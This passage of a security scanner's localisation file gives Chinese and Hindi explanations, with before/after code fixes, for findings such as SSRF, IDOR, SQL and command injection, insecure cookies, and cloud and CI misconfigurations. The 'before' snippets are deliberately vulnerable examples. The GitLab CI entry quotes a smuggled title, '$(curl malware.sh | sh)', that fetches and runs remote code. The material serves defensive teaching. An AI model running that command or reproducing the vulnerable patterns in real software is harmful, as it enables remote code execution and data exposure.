    title: "一个具有管理员权限的函数没有检查使用者身份",
    description:
      "一个名称暗示管理操作的路由或函数，在附近的代码中没有任何身份验证或角色检查。任何知道这个 URL 的人都能执行它。",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "网站可能被强制执行外部代码",
    description:
      "一个外发的 HTTP 请求（fetch、axios）直接把来自用户请求的值当作目标 URL。恶意用户可以借此让你的服务器去调用内部地址或任意地址——服务端请求伪造（SSRF）。",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL not allowed")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "密码使用了如今很容易被破解的保护方式",
    description:
      "同一行代码中，md5() 或 sha1() 被用在了与密码相关的值上。这些算法计算速度太快：拿到数据库的攻击者每秒能尝试数十亿个密码。",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "xss-dangerous-html": {
    title: "用户写的文本可能在浏览器中执行代码",
    description:
      "内容以原始 HTML 的形式插入页面（dangerouslySetInnerHTML、v-html、.innerHTML），而不是作为纯文本。如果这些内容包含用户输入，就可能带有脚本，在阅读该页面的人的浏览器中执行。",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// 如果确实需要 HTML：DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "上传文件的存储空间对任何人可见",
    description:
      "一个存储桶（Supabase Storage、S3）被配置为公开。如果里面有用户上传的文档、照片或文件，任何知道——或猜到——路径的人都能在无需身份验证的情况下访问它们。",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// 用限时签名 URL 提供文件：createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "一个链接就足以删除或更改数据",
    description:
      "一个 GET 路由执行了会更改数据的操作（路径中包含 delete/remove/update/edit）。GET 请求只需要访问一个链接，或者从外部网站加载一张图片就会触发——这正是 CSRF 攻击的经典跳板。",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "保存在浏览器中的登录数据没有得到妥善保护",
    description:
      "一个访问令牌被保存在 localStorage 中。与 httpOnly cookie 不同，页面上运行的任何脚本（包括通过 XSS 注入的恶意脚本）都能读取并窃取它。",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// 从服务端把令牌设置为 httpOnly cookie：\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "网站可能被用来重定向到诈骗网站",
    description:
      "网站把用户重定向到一个直接取自请求（query、body、params）的地址，而没有检查这是否是一个已知域名。一个看起来指向你网站的链接，实际上可能导向一个钓鱼页面。",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "改一下地址栏里的数字，可能就能看到别人的数据",
    description:
      "一条数据库查询直接使用从 URL 中取得的标识符（req.params.id），而没有在附近的代码中检查它是否属于发起请求的用户。改变地址中的 id，可能就能访问到另一个用户的数据——不安全的直接对象引用（IDOR）。",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "header-injection": {
    title: "请求中的值被直接带入 HTTP 响应头",
    description:
      "一个 HTTP 响应头被设置为直接取自请求（query、body、params）的值，而没有检查其中是否包含换行符（CRLF）。攻击者可以借此插入额外的响应头，甚至整个不同的响应——响应拆分（response splitting）——从而操纵缓存、cookie，或其他用户看到的内容。",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "docker-missing-user": {
    title: "Dockerfile 没有设置非 root 用户",
    description:
      "Dockerfile 中没有 USER 指令：没有它，容器就会以 root 身份运行。如果攻击者设法在容器内执行代码（例如利用一个有漏洞的库），容器内的 root 权限会让逃逸到宿主机——或对周边系统造成更大影响——变得更容易。",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Kubernetes 清单没有显式强制以非 root 用户运行",
    description:
      "清单中（无论在 pod 级别还是容器级别）都没有设置 \"runAsNonRoot\"：不设置它，容器就会以镜像所定义的用户运行——如果镜像本身没有改变这一点，往往默认就是 root。显式设为 true 后，如果镜像仍试图以 root 运行，pod 会直接启动失败，而不是等到出事之后才发现。",
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "gha-unpinned-action": {
    title: "CI 中的第三方 action 没有锁定到精确版本（commit SHA）",
    description:
      "该工作流引用第三方 action 时使用的是标签或分支（例如 \"@v1\"、\"@main\"），而不是 commit SHA。维护者——或入侵了其账号的人——可以随时把这个引用指向另一个提交，悄无声息地改变 CI 中实际运行的内容，并拿到其密钥的访问权限。commit SHA 则始终指向完全相同的代码。",
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1，已锁定到 commit SHA —— 更新版本时记得同步更新 SHA`,
    },
  },
  "gha-excessive-permissions": {
    title: "工作流给自己赋予了令牌的所有权限，而不只是实际用到的那些",
    description:
      "\"permissions: write-all\" 让工作流的 GITHUB_TOKEN 对所有内容拥有写权限——issue、pull request、包、部署——即便工作流只用到其中一部分。一旦工作流中的某个步骤被攻陷（一个恶意依赖、一段被注入的脚本），这些更宽泛的权限会扩大攻击者能做的事。",
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # 只列出工作流真正用到的权限`,
    },
  },
  "insecure-cookie-flags": {
    title: "会话或身份验证 cookie 没有设置 Secure 和 HttpOnly 标志",
    description:
      "一个名字类似 session/auth/token 的 cookie，在其选项中没有设置 \"httpOnly\" 和 \"secure\"。没有 httpOnly，页面上的任何 JavaScript（包括通过 XSS 注入的恶意代码）都能读取这个 cookie。没有 secure，它也可能通过未加密的 HTTP 连接被发送。",
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "no-login-rate-limit": {
    title: "登录表单不会阻止连续多次的尝试",
    description:
      "文件中定义了一个登录路由，但同一文件中没有任何速率限制中间件的痕迹。没有尝试次数限制，攻击者就能不受阻碍地连续尝试密码（暴力破解）。",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "密码或敏感数据出现在日志里",
    description:
      "一次 console.log（或类似的）调用包含了一个名为 password、token、secret 或 apiKey 的变量。如果这些日志最终进入外部服务或文件，敏感数据暴露的时间会远超必要范围。",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "k8s-run-as-root": {
    title: "Kubernetes 清单中的一个容器被设置为以 root 身份运行",
    description:
      "securityContext 中的 \"runAsUser: 0\" 或 \"runAsNonRoot: false\" 显式强制容器以 root 身份运行。如果攻击者设法在容器内执行代码（例如利用一个有漏洞的库），容器内的 root 权限会让逃逸到宿主机——或造成更广泛的影响——变得更容易。",
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Kubernetes 清单中的一个容器可以获得比启动时更多的权限",
    description:
      "securityContext 中的 \"allowPrivilegeEscalation: true\" 允许容器内的进程获得比启动它的进程更多的权限（例如通过一个 setuid 二进制文件）。结合应用中的某个漏洞，这就离以超出预期的权限执行代码又近了一步。",
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Kubernetes 清单中的一个 Pod 共享了宿主机的网络、进程或共享内存",
    description:
      "把 \"hostNetwork\"、\"hostPID\" 或 \"hostIPC\" 设为 true，会让 Pod 脱离正常的隔离：hostNetwork 会把 Pod 暴露在宿主机网络上（绕过集群的网络策略），hostPID 让它能看到宿主机上的所有进程，hostIPC 让它能访问宿主机的共享内存。普通应用几乎从不需要这些设置——通常只有底层系统/监控工具才需要。",
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Terraform 中定义的 S3 存储桶禁用了 Block Public Access",
    description:
      "\"aws_s3_bucket_public_access_block\" 的四项保护（block_public_acls、ignore_public_acls、block_public_policy、restrict_public_buckets）中有一项或多项被设为 false。这并不意味着该存储桶已经是公开的，但会移除一道安全网，原本它能防止该存储桶在未来被误设为公开。",
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Terraform 中定义的一条 IAM 策略授予了完全访问权限",
    description:
      "一条 action 为 \"*\"、resource 为 \"*\" 的 statement，授予了对每个 AWS 服务和资源的完全访问权限——这与已经对实时 IAM 状态做过的检查相同，只是这里是在应用之前直接从代码中读取的。它可能是为某个应急角色而刻意设计的，但应当予以确认：日常使用中只应授予真正需要的权限。",
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "一个 Google Cloud Storage 存储桶被设为任何人可读",
    description:
      "一个 \"google_storage_bucket_iam_member\" 或 \"google_storage_bucket_iam_binding\" 资源把某个角色授予了 \"allUsers\" 或 \"allAuthenticatedUsers\"——前者让互联网上任何人（即使没有 Google 账号）都能读取该存储桶；后者让拥有任意 Google 账号的人都能读取，而不仅仅是本该拥有访问权限的人。",
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # 仅授予真正该拥有访问权限的人，而不是 allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "Azure 存储账户启用了 blob 公开访问",
    description:
      "一个 \"azurerm_storage_account\" 的 \"allow_blob_public_access\" 被设为 true：任何知道已公开的 blob/容器 URL 的人，都能在无需任何身份验证的情况下读取它。",
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "一个 Google Cloud IAM 角色授予了完全访问权限（Owner/Editor）",
    description:
      "一个 \"google_project_iam_binding\"/\"google_project_iam_member\"（或组织/文件夹层级的等价设置）赋予了基础角色 \"roles/owner\" 或 \"roles/editor\"——对项目中几乎每个服务都拥有近乎完全的访问权限。它可能是为某个应急账号而刻意设计的，但应当予以确认：日常使用中只应授予真正需要的、更具体的预定义角色。",
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # 只用真正需要的预定义角色，而不是 roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "一条 Azure 角色分配授予了完全访问权限（Owner）",
    description:
      "一个 \"azurerm_role_assignment\" 赋予了 \"Owner\" 角色——对整个分配范围（订阅、资源组……）拥有完全访问权限，包括控制其他用户权限的能力。它可能是为某个应急账号而刻意设计的，但应当予以确认：日常使用中只应授予真正需要的、更具体的角色（例如在单个资源组上的 \"Contributor\"）。",
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # 只用真正需要的、更具体的角色，而不是在整个订阅上使用 Owner\n}`,
    },
  },
  "weak-random-token": {
    title: "安全令牌是用不具备密码学安全性的随机数生成器生成的",
    description:
      "一个名字类似 token/session/reset/otp/csrf 的值，是用 Math.random()（JS）、random.random()（Python）或 rand()（PHP）生成的——这些生成器并不是为安全性设计的，其序列是可预测的。以这种方式生成的令牌可能被猜出或重建，从而使其存在的意义落空（例如一个任何人都能预测到的密码重置链接）。",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // 用 crypto，而不是 Math.random —— 不可预测`,
    },
  },
  "ldap-injection": {
    title: "LDAP 过滤器是通过直接拼接请求中的值构建的",
    description:
      "一行构建 LDAP 过滤器的代码（例如 \"(uid=...)\"）直接包含了一个取自请求的值，而没有对 LDAP 特殊字符做任何转义。控制这个值的人可以改变过滤器的逻辑——比如绕过身份验证检查，或读取他们本不该看到的目录数据。",
    fix: {
      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // 在用于过滤器之前，必须始终对 LDAP 特殊字符进行转义\nclient.search(base, { filter });`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "存在漏洞的依赖："),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "目前还没有已知的修复版本——可以考虑换用其他包，或关注该项目后续的更新。"
      ),
    },
  }),
  "docker-unpinned-base-image": {
    title: "Dockerfile 的基础镜像使用了 \":latest\" 标签",
    description:
      "一条 FROM 指令显式使用了 \":latest\" 标签，而不是一个精确的版本号。\"latest\" 会随时间变化：同一份构建脚本，在不同时间重新构建，可能得到不同版本的基础镜像——这是一个不可复现的构建过程，而且可能在没有人决定要更新的情况下悄悄引入一次不想要的更新。",
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Dockerfile 使用 ADD 而不是 COPY 下载远程文件",
    description:
      "一条带有 http/https URL 的 ADD 指令会在构建过程中从互联网下载文件，既没有完整性校验，内容在仓库中也看不到。一旦这个 URL 遭到攻陷，构建过程就会悄悄拉入任意内容，而仅凭阅读 Dockerfile 没有人能察觉到这一点。",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<预期哈希>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
    "gitlab-ci-script-injection": {
      title: '外部用户可控的值在 GitLab CI 流水线中经过了第二层 shell',
      description: '一行 "script:"（或 "before_script:"/"after_script:"）同时使用了 "eval" 或 "sh -c"/"bash -c" 与一个 GitLab 预定义变量，例如合并请求标题、提交信息或分支名 —— 这些内容任何人只要打开一个合并请求（即使来自外部 fork）都能写入。该值先被外层 shell 展开一次，然后被拼接进一个字符串，由第二层 shell 再次作为代码解析：像 "$(curl malware.sh | sh)" 这样的标题会在流水线中执行任意命令，并能访问该任务可用的所有密钥。',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # 作为参数传给命令，而不是放进会被重新解析的 "bash -c" 字符串里`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'GitLab CI 流水线中的 Docker-in-Docker 禁用了 TLS 加密',
      description: '该任务使用了 "docker:dind" 服务（Docker-in-Docker，用于在流水线中构建镜像），但将 "DOCKER_TLS_CERTDIR" 设为空字符串，完全禁用了 Docker 客户端与 dind 守护进程之间的 TLS 加密。没有 TLS 的情况下，任何能访问 runner 内部网络上该端口的人都能控制这个拥有扩展权限的 Docker 守护进程，而不仅限于本该使用它的任务。',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # 保持 Docker 客户端与 dind 守护进程之间的 TLS 加密 —— ""会完全禁用它`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'GitLab CI 流水线的 Docker 镜像没有固定到具体版本',
      description: '流水线中的 "image:" 指向一个没有标签的镜像（等同于 ":latest"）或明确使用了 ":latest"。维护该镜像的人可以随时替换其内容而无需改动仓库 —— 同一条流水线可能在某天突然开始运行不同的代码，这种供应链风险在概念上等同于用标签而非提交引用的 GitHub Action。',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # 使用具体标签（或者更好地使用摘要 "node@sha256:..."）而不是 "latest"`,
      },
    },
},
  hi: {
  "supabase-service-role-in-client": {
    title: "Supabase की गुप्त कुंजी ब्राउज़र के लिए बनी फ़ाइल में पहुँच जाती है",
    description:
      "सार्वजनिक प्रीफ़िक्स वाला कोई वेरिएबल (जैसे NEXT_PUBLIC_, VITE_) या कोई क्लाइंट-साइड फ़ाइल Supabase की service role key का संदर्भ देती है। यह कुंजी Row Level Security को बायपास कर देती है: अगर यह ब्राउज़र बंडल में पहुँच जाए, तो कोई भी इसे पढ़कर डेटाबेस एडमिन की तरह काम कर सकता है।",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (केवल सर्वर)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "पासवर्ड या गुप्त कुंजियाँ सीधे कोड में लिखी गई हैं",
    description:
      "कोई API कुंजी, टोकन या पासवर्ड एक लिटरल वैल्यू के रूप में लिखा दिखता है, न कि एनवायरनमेंट वेरिएबल से पढ़ा गया। जो भी सोर्स कोड पढ़ता है (या रिपॉज़िटरी, अगर पब्लिक है) उसे वह गुप्त जानकारी मिल जाती है।",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "प्रोजेक्ट के असली पासवर्ड वाली एक फ़ाइल विश्लेषण की गई फ़ाइलों में शामिल है",
    description:
      "असली वैल्यू वाली एक .env फ़ाइल (न कि .env.example) विश्लेषण में शामिल है। अगर यह फ़ाइल किसी रिपॉज़िटरी या पब्लिक डिप्लॉय में पहुँच जाए, तो इसमें मौजूद हर क्रेडेंशियल उजागर हो जाता है।",
    fix: {
      before: `# .env (गलती से कमिट हो गई)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (कमिट की गई)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env रिपो से बाहर रहती है (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "कोई भी हर उपयोगकर्ता का डेटा पढ़ या बदल सकता है",
    description:
      "Row Level Security बंद है, या कोई पॉलिसी बिना यह जाँचे कि अनुरोध कौन कर रहा है, सबको एक्सेस देती है (USING (true))। हर लॉग-इन किया हुआ उपयोगकर्ता — यहाँ तक कि कोई अज्ञात व्यक्ति भी — बाकी सबका डेटा पढ़ या बदल सकता है।",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "उपयोगकर्ता द्वारा डाली गई वैल्यू सीधे डेटाबेस क्वेरी में चिपका दी जाती है",
    description:
      "एक SQL क्वेरी पैरामीटर इस्तेमाल करने के बजाय सीधे स्ट्रिंग जोड़कर या इंटरपोलेट करके बनाई जाती है। अगर वह टेक्स्ट (भले ही परोक्ष रूप से) किसी उपयोगकर्ता से आता है, तो वह खुद क्वेरी को बदल सकता है — SQL injection।",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "पासवर्ड सुरक्षित नहीं लगते",
    description:
      "पासवर्ड फ़ील्ड को बिल्कुल वैसा ही सेव किया जाता है जैसा अनुरोध में आया था, और फ़ाइल में कोई हैशिंग फ़ंक्शन (bcrypt, argon2, scrypt) नहीं दिखता। अगर डेटाबेस से छेड़छाड़ हो जाए, तो हर पासवर्ड तुरंत इस्तेमाल करने लायक हो जाता है।",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "लॉगिन को साइन करने में इस्तेमाल होने वाला सीक्रेट कोड में साफ़ टेक्स्ट में लिखा है",
    description:
      "jwt.sign / jwt.verify को दिया गया सीक्रेट (या JWT_SECRET वेरिएबल) एनवायरनमेंट वेरिएबल से आने के बजाय कोड में एक लिटरल वैल्यू है। जो भी इसे पढ़ता है वह किसी भी उपयोगकर्ता के लिए वैध एक्सेस टोकन बना सकता है।",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "सर्वर को बाहरी कमांड चलाने के लिए मजबूर किया जा सकता है",
    description:
      "सिस्टम कमांड चलाने वाला एक फ़ंक्शन (exec, execSync, spawn) इंटरपोलेशन या कॉन्कैटेनेशन से बनी एक स्ट्रिंग लेता है। अगर उस स्ट्रिंग का कोई हिस्सा उपयोगकर्ता इनपुट से आता है, तो जो उसे कंट्रोल करता है वह सर्वर पर मनमाने कमांड चला सकता है।",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "path-traversal": {
    title: "सर्वर पर मौजूद फ़ाइल को बाहर से रास्ता चुनकर पढ़ा या लिखा जा सकता है",
    description:
      "कोई फ़ाइल पढ़ने, लिखने या भेजने वाला फ़ंक्शन, बिना यह जाँचे कि वह एक तय फ़ोल्डर के भीतर ही रहे, अनुरोध की किसी वैल्यू (query, body, params) से सीधे रास्ता लेता है। हमलावर तय फ़ोल्डर से बाहर निकलने के लिए \"../\" डाल सकता है और सर्वर पर मौजूद किसी भी फ़ाइल को पढ़ या ओवरराइट कर सकता है (जैसे क्रेडेंशियल वाली कॉन्फ़िगरेशन फ़ाइल)।",
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("रास्ते की अनुमति नहीं है")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "उपयोगकर्ता द्वारा डाली गई वैल्यू MongoDB क्वेरी के अंदर कोड की तरह चला दी जाती है",
    description:
      "MongoDB का $where ऑपरेटर हर डॉक्यूमेंट के लिए सर्वर-साइड JavaScript चलाता है — अगर वह स्ट्रिंग उपयोगकर्ता से आई किसी वैल्यू को जोड़कर बनाई गई है, तो जो उसे कंट्रोल करता है वह डेटाबेस के संदर्भ में मनमाना कोड चलवा सकता है, न कि सिर्फ़ सामान्य SQL injection की तरह फ़िल्टर बदल सकता है।",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "उपयोगकर्ता द्वारा डाली गई वैल्यू को टेम्पलेट की तरह समझा जाता है, न कि डेटा की तरह",
    description:
      "टेम्पलेट कंपाइल/रेंडर करने वाला एक फ़ंक्शन एक तय टेम्पलेट इस्तेमाल करके सिर्फ़ डेटा भेजने के बजाय, अनुरोध की किसी वैल्यू से पूरा टेम्पलेट लेता है। हमलावर सीधे टेम्पलेट इंजन की सिंटैक्स में लिख सकता है (जैसे Jinja2 के लिए {{7*7}}) और सर्वर पर कोड चला सकता है — Server-Side Template Injection, जो अक्सर XSS जैसी सिर्फ़ डिस्प्ले की समस्या तक सीमित न रहकर मनमाने कमांड चलाने तक पहुँच जाता है।",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "XML पार्सर को फ़ाइलें पढ़ने या बाहरी अनुरोध भेजने के लिए मजबूर किया जा सकता है",
    description:
      "कोई XML पार्सर (DocumentBuilderFactory) आसपास की लाइनों में बाहरी एंटिटी (DOCTYPE) को साफ़ तौर पर बंद किए बिना बनाया जाता है। अगर पार्सर को किसी अविश्वसनीय स्रोत से XML मिलता है, तो हमलावर एक बाहरी एंटिटी डिफ़ाइन करके सर्वर पर फ़ाइलें पढ़ सकता है या इसे अपनी पसंद के किसी पते से संपर्क करवा सकता है — XML External Entity।",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "docker-hardcoded-secret": {
    title: "Dockerfile में किसी ENV या ARG इंस्ट्रक्शन में एक सीक्रेट सीधे लिखा है",
    description:
      "password/secret/token/key जैसे नाम वाले किसी वेरिएबल की ENV या ARG इंस्ट्रक्शन में एक लिटरल वैल्यू है। .env फ़ाइल (जो आमतौर पर इमेज में नहीं पहुँचती) के उलट, यह वैल्यू सीधे Docker इमेज में ही पक्की हो जाती है — जो भी इसे पुल कर सकता है या लेयर हिस्ट्री देख सकता है, वह इसे वापस पा सकता है, भले ही बाद के किसी Dockerfile वर्शन में वह लाइन हटा दी जाए।",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# इस तरह पास करें: docker build --build-arg DB_PASSWORD=*** (या, और भी बेहतर,\n# एक BuildKit secret mount, जो कभी लेयर हिस्ट्री में नहीं पहुँचता)`,
    },
  },
  "k8s-privileged-container": {
    title: "Kubernetes मैनिफ़ेस्ट में एक कंटेनर प्रिविलेज्ड मोड में चल रहा है",
    description:
      'किसी कंटेनर के securityContext में "privileged: true" कंटेनर और होस्ट के बीच की लगभग सारी सामान्य आइसोलेशन बंद कर देता है: कंटेनर होस्ट के डिवाइसों तक पहुँच सकता है, उसका नेटवर्क कॉन्फ़िगरेशन बदल सकता है, और कई मामलों में उस मशीन पर प्रभावी रूप से root एक्सेस पा सकता है जिस पर वह चल रहा है। सामान्य ऐप के लिए यह लगभग कभी ज़रूरी नहीं होता।',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # सिर्फ़ वही capabilities जो वाकई ज़रूरी हैं`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Kubernetes मैनिफ़ेस्ट की env वेरिएबल में एक सीक्रेट साफ़ टेक्स्ट में लिखा है",
    description:
      'password/secret/token/key जैसे नाम वाली किसी एनवायरनमेंट वेरिएबल की एक लिटरल वैल्यू ("value:") है, न कि यह किसी Secret से पढ़ी जा रही हो ("valueFrom.secretKeyRef")। मैनिफ़ेस्ट खुद — जो अक्सर किसी रिपॉज़िटरी में कमिट होता है — इस तरह सीक्रेट को साफ़ टेक्स्ट में रखता है, जो उस व्यक्ति को भी दिख जाता है जो सिर्फ़ कॉन्फ़िगरेशन पढ़ सकता है, क्लस्टर में कमांड चलाना ज़रूरी नहीं।',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "terraform-open-security-group": {
    title: "एक Terraform security group पूरे इंटरनेट के लिए एक संवेदनशील पोर्ट खोल देता है",
    description:
